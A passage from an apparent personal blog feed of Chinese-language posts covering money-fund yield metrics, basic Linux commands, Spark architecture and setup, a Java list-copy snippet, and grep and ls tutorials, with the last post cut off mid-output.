      <url>/2022/03/02/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<p>谢邀作答。理财君就题主的提问，结合实例回答一下这两者的区别。</p><p><strong>回答这个问题之前，要先来搞清楚 「</strong><a href="https://www.zhihu.com/search?q=%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">七天年化收益率</a><strong>」和「年利率」究竟是什么意思呢？</strong></p><ul><li><strong>「七天年化收益率」</strong></li></ul><p>指将<a href="https://www.zhihu.com/search?q=%E8%B4%A7%E5%B8%81%E5%9F%BA%E9%87%91&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">货币基金</a>过去7天所获的总收益进行年化计算之后得出的数据。具体的操作方法是将7天的总收益率除以7，得到过去7天的平均日收益率，再乘上365天，得到七日年化收益率。<br><strong>公式：七日年化收益率 = 七日总收益率（%）/ 7 x 365</strong></p><p>举个例子，某货币基金过去7天总获得0.07%的收益率，那么过去7天每天平均产生的收益率为0.01%（即万分之一），七天年化收益率也就是3.65%（0.07%/7x365）</p><p>作为一个直观的收益指标，七天年化收益率是投资者选择投资基金的重要指标，平时大家看到的<a href="https://www.zhihu.com/search?q=%E5%AD%98%E6%AC%BE%E5%88%A9%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">存款利率</a>、理财产品、逆回购等金融产品也多采用了年化收益率作为计价方式。</p><ul><li><strong>「年利率」</strong></li></ul><p>利率，是指一定期限内利息额与本金的比率，一般分为年利率、月利率和日利率三种。</p><p>而<strong>年利率就是指以一年（365天）为计息周期计算的利息额与本金的比率。</strong></p><p><strong>公式：年利率 = <strong><a href="https://www.zhihu.com/search?q=%E4%B8%80%E5%B9%B4%E6%9C%9F%E5%88%A9%E6%81%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">一年期利息</a></strong> ÷ 本金 × 100%</strong></p><p>再举个例子，小明将100元的本金存入银行，若XX银行答应的年利率为3.5%，那么一年之后除了本金之外，小明可以获得3.5元的利息。</p><p><strong>在搞清楚它们的概念之后，「七天年化收益率」和「年利率」有什么区别呢？</strong></p><p>对于投资者而言，它们最大的区别就在于， 在一年之中年利率是“所见即所得”的 ，而七天年化收益率则是“所见并非所得”。</p><p>年利率在一年之中是固定不变的，也就是所见即所得。即投资者在投入本金时看到的年利率，也就是其一年后所获的收益。</p><p>而对七天年化收益率而言，它的缺点就是所见并非所得。即<a href="https://www.zhihu.com/search?q=%E4%B8%83%E6%97%A5%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">七日年化收益率</a>并非等于实际收益。</p><p>七天年化收益率是把基金过去7天的收益率考虑在内，并进行年化以后算出的指标。举例来说，若小明投资的XX基金显示当日该基金的七天年化收益率为3.5%，假设之后整年收益率按照这一标准不变，那么小明获得的整年收益也是3.5%。</p><p>通过这种方法计算得出的七天年化收益率，存在这样一个缺点——每日实际收益水平可能会低于或高于平均收益水平。</p><p>在这7天内若某一日的单日收益特别高，会使得这一日前后7天呈现出一个非常高的七日年化收益率。也就是说若投资者在释放收益这天之后买入，后续几天虽然看起来七日年化收益率很高，但实际进入投资者口袋的收益却有可能非常一般。<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/0.png"><br><strong>那么对于「七天年化收益率」的这个缺点该如何弥补呢？</strong></p><p>这时候就不得不提起它的黄金搭档「每万份收益」了。</p><p>每万份收益指的是每一万份货币基金每天产生多少收益，即货币基金持有人每天能够<strong>真实得到的收益。</strong></p><p>举个例子，假如某只货币基金的每万份收益是1元，就是说投资者持有1万份该货币基金，每天能够获取1元的收益，按单日年化其实就是3.65%（因为每万份收益1元，即每天产生0.01%的收益，经过一年365天年化后的收益率即为3.65%）。</p><p>实际上，七日年化收益率是对每万份收益的一个平滑处理，二者相辅相成，放在一起就能够比较全面的考察一个货币基金的短期业绩情况。若要看长期业绩，当然还是可以看今年以来，近一年，近半年这样的长期指标。</p><p>想要了解七日年化收益和每万份收益有何不同么？<br>想知道货币基金究竟是如何估值的？<br><a href="https://zhuanlan.zhihu.com/p/86092605">点击文章链接，了解更多！</a><br>​</p><blockquote><p>作者：腾讯理财通<br>链接：<a href="https://www.zhihu.com/question/22688887/answer/875128840">https://www.zhihu.com/question/22688887/answer/875128840</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 理财 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收益指标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux实战100讲</title>
      <link href="/2022/02/22/Linux%E5%AE%9E%E6%88%98100%E8%AE%B2/"/>
      <url>/2022/02/22/Linux%E5%AE%9E%E6%88%98100%E8%AE%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man -a ls  #查找所有章节</span><br><span class="line">help cd</span><br><span class="line">ls --help</span><br></pre></td></tr></table></figure><p>按q退出<br>​</p><p>​</p><h2 id="一些皆文件"><a href="#一些皆文件" class="headerlink" title="一些皆文件"></a>一些皆文件</h2><h3 id="显示当前的目录名称"><a href="#显示当前的目录名称" class="headerlink" title="显示当前的目录名称"></a>显示当前的目录名称</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><h3 id="更改当前的操作目录"><a href="#更改当前的操作目录" class="headerlink" title="更改当前的操作目录"></a>更改当前的操作目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/....绝对路径 </span><br><span class="line">cd ./path/to/...相对路径  和不写./一样的效果</span><br><span class="line">cd ../path/to/...相对路径 指的是上级目录下</span><br></pre></td></tr></table></figure><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l 长格式显示文件</span><br><span class="line">   -a 显示隐藏文件</span><br><span class="line">   -r逆序显示</span><br><span class="line">   -t 按照时间顺序显示</span><br><span class="line">   -R 递归显示</span><br></pre></td></tr></table></figure><h3 id="附：切换为root用户"><a href="#附：切换为root用户" class="headerlink" title="附：切换为root用户"></a>附：切换为root用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - root</span><br></pre></td></tr></table></figure><p>之后每一行末尾会变成‘#’<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整体架构</title>
      <link href="/2022/02/16/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/"/>
      <url>/2022/02/16/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="首先了解一下大数据处理框架的四层结构"><a href="#首先了解一下大数据处理框架的四层结构" class="headerlink" title="首先了解一下大数据处理框架的四层结构"></a>首先了解一下大数据处理框架的四层结构</h2><p><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/0.png"><br><strong>注意：上图体现了rdd和task的关系</strong><br><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/1.png"></p><ul><li><strong>上图所示，即大数据处理框架四层结构，下面将逐一介绍</strong></li></ul><h3 id="用户层"><a href="#用户层" class="headerlink" title="用户层"></a>用户层</h3><ul><li><strong>这一层主要是准备输入数据、Spark或Hadoop的用户代码、配置参数</strong><ul><li><strong>输入数据：一般以分块形式存在HDFS或者Hbase或数据库中</strong></li><li><strong>用户代码：这里需要了解的是，编写代码后会生成一个Driver程序，将代码提交给集群运行，如下图所示，提交Spark代码后，生成的Driver程序可以广播数据给各个task，并且收集task的运行结果</strong></li></ul></li></ul><p><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/2.png"></p><ul><li><strong>配置参数：一种是资源需求参数如资源容器数和Cpu大小等，另一种是数据流参数如数据分片大小和分片个数等见四层结构图即可</strong></li></ul><h3 id="分布式数据并行处理层"><a href="#分布式数据并行处理层" class="headerlink" title="分布式数据并行处理层"></a>分布式数据并行处理层</h3><ul><li><strong>这一层是把用户提交的应用转化为计算任务，然后调用下一层(资源管理与任务调度层)实现并行执行</strong><ul><li><strong>转化过程：MapReduce直接就map-shuffle-reduce，但是Spark不一样，如下图所示</strong></li></ul><ol><li><strong>Spark首先要把Spark代码转化为逻辑处理流程，数据处理流程包括数据单元RDD和数据依赖关系，图中每个数据单元RDD里的圆形是RDD的多个数据分片，正方形指的是输入数据分片</strong></li><li><strong>然后如图对逻辑处理流程进行划分，生成物理执行计划，包含多个stage，每个stage包含多个task，task个数一般就是RDD中数据分片的个数</strong><br><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/3.png"></li></ol></li></ul><h3 id="资源管理与任务调度层"><a href="#资源管理与任务调度层" class="headerlink" title="资源管理与任务调度层"></a>资源管理与任务调度层</h3><ul><li><strong>这一层就是资源管理和任务调度，如下图所示</strong></li><li><strong>对于资源管理来说，Spark部署模式不同这一层的工作就不同</strong><ul><li><strong>这里仅介绍Spark的Standalone模式，其他模式后面章节会详细介绍</strong></li><li><strong>Standalone模式类似于MapReduce。区别在于MapReduce为每个task将要运行时启动一个JVM进程，而Spark是预先启动资源容器(Executor JVM)，然后在task执行时在JVM中启动task线程</strong></li></ul></li><li><strong>任务调度有两种调度器：一种是作业调度器：决定多个作业执行顺序；一种是任务调度器，决定多个task执行顺序。下图所示的是先进先出的任务调度器</strong><br><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/4.png"></li></ul><h3 id="物理执行层"><a href="#物理执行层" class="headerlink" title="物理执行层"></a>物理执行层</h3><ul><li><strong>这一层就是负责启动task</strong></li><li><strong>在Spark中一个作业有很多阶段(stage)，每个stage包含很多task，每个task又对应一个JVM的的线程，一个JVM可以同时运行多个task，所以一个JVM的内存空间由多个task共享</strong></li></ul><h2 id="下面介绍Spark的Standalone模式的系统架构"><a href="#下面介绍Spark的Standalone模式的系统架构" class="headerlink" title="下面介绍Spark的Standalone模式的系统架构"></a>下面介绍Spark的Standalone模式的系统架构</h2><p><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/5.png"></p><ul><li><strong>上图所示即为Standalone模式架构图，下面将详细介绍</strong></li><li><strong>首先需要了解几个概念：</strong><ul><li><strong>MasterNode：该节点上常驻Master进程，负责管理全部WorkerNode</strong></li><li><strong>WorkerNode：该节点上常驻Worker进程，负责管理执行Spark任务</strong></li><li><strong>Spark作业：就是一个Spark程序，例如WordCount.scala</strong></li><li><strong>Drive进程：就是运行Spark程序中main()函数的进程</strong></li><li><strong>Executor：就是Spark计算资源的一个单位，用这个单位来占用集群资源，然后分配具体的task给Executor。在Standalone模式中，启动Executor实际上是启动图中的CoarseGrainedExecutorBackend的JVM进程</strong></li><li><strong>Task：Driver在运行main()函数时，会把一个作业拆成多个task，以线程方式在Executor执行如map算子、reduce算子。每个Executor具有多少个cpu就可以运行多少个task，如图中八个cpu两个Executor，故每个Executor可以并行运行4个task</strong></li></ul></li><li><strong>然后介绍一下流程：</strong><ol><li><strong>启动Spark集群时，Master节点会启动Master进程，Worker节点上启动Worker进程</strong></li><li><strong>接下来就提交作业给Master节点，Master节点会通知Worker节点启动Executor</strong></li><li><strong>分配task到Executor上执行，每个Executor可以执行多个task，每个task启动一个线程来执行</strong></li></ol></li><li><strong>还有一些细节：</strong><ul><li><strong>Worker进程上有一个或多个ExecutorRunner对象，每个对象可以控制一个CoarseGrainedExecutorBackend进程的启动和关闭</strong></li></ul></li></ul><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="​Spark-的运行流程？"><a href="#​Spark-的运行流程？" class="headerlink" title="​Spark 的运行流程？"></a>​Spark 的运行流程？</h3><p><img src="http://106.12.125.218/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/6.png"><br>具体运行流程如下: </p><ol><li>SparkContext 向资源管理器注册并向资源管理器申请运行Executor</li><li>资源管理器分配 Executor,然后资源管理器启动Executor </li><li> Executor 发送心跳至资源管理器 </li><li>SparkContext 构建 DAG 有向无环图 </li><li>将DAG分解成 Stage (TaskSet) </li><li>把 Stage 发送给 TaskScheduler </li><li>Executor 向 SparkContext 申请 Task </li><li>TaskScheduler 将 Task 发送给 Executor 运行 </li><li>同时 SparkContext 将应用程序代码发放给Executor </li><li>Task 在 Executor 上运行,运行完毕释放所有资源</li></ol><h3 id="​Spark-有哪些组件？"><a href="#​Spark-有哪些组件？" class="headerlink" title="​Spark 有哪些组件？"></a>​Spark 有哪些组件？</h3><ul><li>master：管理集群和节点，不参与计算</li><li>worker： 计算节点，进程本身不参与计算，和 master 汇报</li><li>Driver：运行程序的 main 方法，创建 spark context 对象</li><li>spark context:控制整个 application 的生命周期,包括 dagsheduler 和 task scheduler 等组件</li><li>client: 用户提交程序的入口.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置spark开发环境</title>
      <link href="/2022/02/16/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2022/02/16/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="如何在IDEA中配置Spark开发环境？"><a href="#如何在IDEA中配置Spark开发环境？" class="headerlink" title="如何在IDEA中配置Spark开发环境？"></a>如何在IDEA中配置Spark开发环境？</h2><ol><li><strong>首先自行下载scala，并在IDEA中加入scala的SDK，因为spark2.4.3依赖scala2.11，故这里下载scala2.11.11</strong></li></ol><p>[<img src="http://106.12.125.218/medias/medias/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/0.png"></p><ol><li><strong>并在pom.xml中添加spark2.4.3的依赖</strong><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java动态数组添加另一个动态数组</title>
      <link href="/2022/02/12/java%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E6%B7%BB%E5%8A%A0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/"/>
      <url>/2022/02/12/java%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E6%B7%BB%E5%8A%A0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>下面两种写法是等价的，这样添加数组不受数组后续变动的影响！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ans.add(<span class="keyword">new</span> LinkedList&lt;&gt;(tmp));</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LinkedList&lt;Integer&gt; tmps = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i :tmp)</span><br><span class="line">tmps.add(i);</span><br><span class="line">ans.add(tmps);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux小技巧之grep</title>
      <link href="/2022/02/10/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/"/>
      <url>/2022/02/10/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/</url>
      
        <content type="html"><![CDATA[<p><strong>作为linux中最为常用的三大文本（awk，sed，grep）处理工具之一，掌握好其用法是很有必要的。</strong><br><strong>首先谈一下grep命令的常用格式为：grep  [选项]  ‘模式’  [文件]</strong><br><strong>grep家族总共有三个：grep，egrep，fgrep。</strong></p><h2 id="常用选项："><a href="#常用选项：" class="headerlink" title="常用选项："></a>常用选项：</h2><p><strong>-E ：开启扩展（Extend）的正则表达式。</strong><br><strong>-i ：忽略大小写（ignore case）。</strong><br><strong>-v ：反过来（invert），只打印没有匹配的，而匹配的反而不打印。</strong><br><strong>-n ：显示行号</strong><br><strong>-w ：被匹配的文本只能是单词，而不能是单词中的某一部分，如文本中有liker，而我搜寻的只是like，就可以使用-w选项来避免匹配liker</strong><br><strong>-c ：显示总共有多少行被匹配到了，而不是显示被匹配到的内容，注意如果同时使用-cv选项是显示有多少行没有被匹配到。</strong><br><strong>-o ：只显示被模式匹配到的字符串。</strong><br><strong>–color :将匹配到的内容以颜色高亮显示。</strong><br><strong>-A  n：显示匹配到的字符串所在的行及其后n行，after</strong><br><strong>-B  n：显示匹配到的字符串所在的行及其前n行，before</strong><br><strong>-C  n：显示匹配到的字符串所在的行及其前后各n行，context</strong><br><strong>​</strong><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/0.png"><br><strong>​</strong><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/1.png"><br><strong>​</strong></p><p><strong>​</strong></p><h2 id="模式部分："><a href="#模式部分：" class="headerlink" title="模式部分："></a>模式部分：</h2><p><strong>1、直接输入要匹配的字符串，这个可以用fgrep（fast grep）代替来提高查找速度，比如我要匹配一下hello.c文件中printf的个数：fgrep  -c  “printf”  hello.c</strong><br><strong>2、使用基本正则表达式，下面谈关于基本正则表达式的使用：</strong><br><strong>匹配字符：</strong><br><strong>. ：任意一个字符。</strong><br><strong>[abc] ：表示匹配一个字符，这个字符必须是abc中的一个。</strong><br><strong>[a-zA-Z] ：表示匹配一个字符，这个字符必须是a-z或A-Z这52个字母中的一个。</strong><br><strong>[^123] ：匹配一个字符，这个字符是除了1、2、3以外的所有字符。</strong><br><strong>对于一些常用的字符集，系统做了定义：</strong><br><strong>[A-Za-z] 等价于 [[:alpha:]]</strong><br><strong>[0-9] 等价于 [[:digit:]]</strong><br><strong>[A-Za-z0-9] 等价于 [[:alnum:]]</strong><br><strong>tab,space 等空白字符 [[:space:]]</strong><br><strong>[A-Z] 等价于 [[:upper:]]</strong><br><strong>[a-z] 等价于 [[:lower:]]</strong><br><strong>标点符号 [[:punct:]]</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/2.png"><br><strong>​</strong></p><p><strong>​</strong></p><p><strong>匹配次数：</strong><br>**{m,n} ：匹配其前面出现的字符至少m次，至多n次。<br>? ：匹配其前面出现的内容0次或1次，等价于{0,1}。</p><ul><li>：匹配其前面出现的内容任意次，等价于{0,}，所以 “.<em>“ 表述任意字符任意次，即无论什么内容全部匹配。</em>*<br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/3.png"></li><li><em>​</em>*</li></ul><p><strong>​</strong></p><p><strong>​</strong></p><p><strong>位置锚定：</strong><br><strong>^ ：锚定行首</strong><br><strong>$ ：锚定行尾。技巧：”^$”用于匹配空白行。</strong><br><strong>\b或&lt;：锚定单词的词首。如”\blike”不会匹配alike，但是会匹配liker**<br>**\b或&gt;：锚定单词的词尾。如”\blike\b”不会匹配alike和liker，只会匹配like</strong><br><strong>\B ：与\b作用相反。</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/4.png"><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/5.png"><br><strong>​</strong></p><p><strong>​</strong></p><p><strong>分组及引用：</strong><br><strong>(string) ：将string作为一个整体方便后面引用</strong><br><strong>\1 ：引用第1个左括号及其对应的右括号所匹配的内容。</strong><br><strong>\2 ：引用第2个左括号及其对应的右括号所匹配的内容。</strong><br><strong>\n ：引用第n个左括号及其对应的右括号所匹配的内容。</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/6.png"><br><strong>​</strong></p><p><strong>​</strong></p><p><strong>3、扩展的（Extend）正则表达式（注意要使用扩展的正则表达式要加-E选项，或者直接使用egrep）：</strong><br><strong>匹配字符：这部分和基本正则表达式一样</strong><br><strong>​</strong></p><p><strong>匹配次数：</strong><br>*** ：和基本正则表达式一样**<br><strong>? ：基本正则表达式是?，二这里没有\。</strong><br><strong>{m,n} ：相比基本正则表达式也是没有了\。</strong><br><strong>+ ：匹配其前面的字符至少一次，相当于{1,}。</strong><br><strong>​</strong></p><p><strong>位置锚定：和基本正则表达式一样。</strong><br><strong>​</strong></p><p><strong>分组及引用：</strong><br><strong>(string) ：相比基本正则表达式也是没有了\。</strong><br><strong>\1 ：引用部分和基本正则表达式一样。</strong><br><strong>\n ：引用部分和基本正则表达式一样。</strong><br><strong>​</strong></p><p><strong>或者：</strong><br><strong>a|b ：匹配a或b，注意a是指 | 的左边的整体，b也同理。比如 C|cat 表示的是 C或cat，而不是Cat或cat，如果要表示Cat或cat，则应该写为 (C|c)at 。记住(string)除了用于引用还用于分组。</strong><br><strong>​</strong></p><p><strong>注1：默认情况下，正则表达式的匹配工作在贪婪模式下，也就是说它会尽可能长地去匹配，比如某一行有字符串 abacb，如果搜索内容为 “a.<em>b” 那么会直接匹配 abacb这个串，而不会只匹配ab或acb。</em>*<br>*<em>注2：所有的正则字符，如 [ 、</em> 、( 等，若要搜索 * ，而不是想把 * 解释为重复先前字符任意次，可以使用 * 来转义。</strong><br><strong>​</strong></p><p><strong>下面用一个练习来结束本次grep的学习：</strong><br><strong>在网络配置文件 /etc/sysconfig/network-scripts/ifcfg-ens33 中检索出所有的 IP</strong><br><strong>1、检索出 0-255的范围</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/7.png"><br><strong>2、由0-255的数字组合成IP</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/8.png"><br><strong>3、简化</strong><br><img src="http://106.12.125.218/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/9.png"></p><h2 id="附：配合ls使用"><a href="#附：配合ls使用" class="headerlink" title="附：配合ls使用"></a>附：配合ls使用</h2><p>只列出子目录</p><ol><li>ls -F | grep /$ 或者 alias sub = “ls -F | grep /$”(linux)</li><li>ls -l | grep “^d” 或者 ls -lL | grep “^d” (Solaris)<br>计算当前目录下的文件数和目录数<br>下面命令可以分别计算当前目录下的文件和目录个数：<h1 id="ls-l-grep-“-“-wc-l-—-to-count-files"><a href="#ls-l-grep-“-“-wc-l-—-to-count-files" class="headerlink" title="ls -l * |grep “^-“|wc -l —- to count files"></a>ls -l * |grep “^-“|wc -l —- to count files</h1><h1 id="ls-l-grep-“-d”-wc-l-—–-to-count-dir"><a href="#ls-l-grep-“-d”-wc-l-—–-to-count-dir" class="headerlink" title="ls -l * |grep “^d”|wc -l —– to count dir"></a>ls -l * |grep “^d”|wc -l —– to count dir</h1><blockquote><p>参考资料：<a href="https://www.cnblogs.com/flyor/p/6411140.html">https://www.cnblogs.com/flyor/p/6411140.html</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux小技巧之ls</title>
      <link href="/2022/02/09/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bls/"/>
      <url>/2022/02/09/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bls/</url>
      
        <content type="html"><![CDATA[<p>ls 命令的含义是list显示当前目录中的文件名字。注意不加参数它显示除隐藏文件外的所有文件及目录的名字。<br>​</p><p>​<strong>1）ls –a 显示当前目录中的所有文件，包含隐藏文件</strong><br>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -a</span><br></pre></td></tr></table></figure><p>​</p><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -a</span><br><span class="line">.                  lantern-installer-beta.apk                Zombiesrunfree.apk</span><br><span class="line">..                 lantern-installer-beta.zip                照片资料</span><br><span class="line">1.07.apk           Pokémon.GO_com.nianticlabs.pokemongo.apk  软件下载</span><br><span class="line">com_pokemongo.apk  Psiphon3.apk                              邮件附件下载</span><br><span class="line">Green.apk          yxzx.apk                                  雏鹰日志</span><br></pre></td></tr></table></figure><p>ps：隐藏文件是在文件名字以“.”（英文句号）开头的文件<br><strong>2）ls –l 显示文件及其详细信息</strong><br>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -l</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -l</span><br><span class="line">total 207440</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  6023990 Aug  9 15:53 1.07.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 62823571 Aug  9 16:43 com_pokemongo.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  7193125 Aug  9 16:05 Green.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  5406068 Mar 23 21:31 lantern-installer-beta.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  4572221 Aug  8 19:16 lantern-installer-beta.zip</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 62823571 Aug  8 15:28 